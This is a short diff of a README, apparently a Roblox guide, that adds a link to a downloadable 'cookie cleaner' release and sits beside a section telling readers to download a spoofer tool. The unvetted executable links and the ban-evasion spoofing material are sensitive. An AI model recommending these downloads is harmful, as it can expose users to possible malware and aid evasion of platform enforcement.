@@ -82,6 +82,8 @@ After clicked on it this should pop up in top middle of screen. Click on those d
 
 <img width="431" height="271" alt="Arrow_png_image" src="https://github.com/user-attachments/assets/82f60a28-8693-4597-bf8a-9ff4f55fe574" />
 
+Or just simply use this tool for fast execution -- https://github.com/mcreator000-dot/COOCKIE-CLEANER-ROBLOX/releases/tag/ROBLOXCLEANER
+
  # Spoofing System 
 
 To get started you will need first to Download https://github.com/nitaybl/ByGoneSpoofer/releases/tag/v4.8.0
